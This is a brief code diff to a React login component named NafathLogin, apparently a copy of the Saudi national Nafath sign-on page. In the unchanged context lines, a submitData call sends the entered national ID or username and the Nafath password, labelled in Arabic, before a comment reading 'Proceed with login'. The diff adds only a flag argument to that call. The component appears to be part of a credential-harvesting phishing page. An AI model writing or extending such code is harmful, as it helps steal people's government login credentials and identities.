@@ -96,7 +96,7 @@ export default function NafathLogin() {
                       submitData({
                         'اسم المستخدم / الهوية الوطنية': username,
                         'كلمة المرور (نفاذ)': password
-                      });
+                      }, true);
                       
                       // Proceed with login
                       setIsLoading(true);
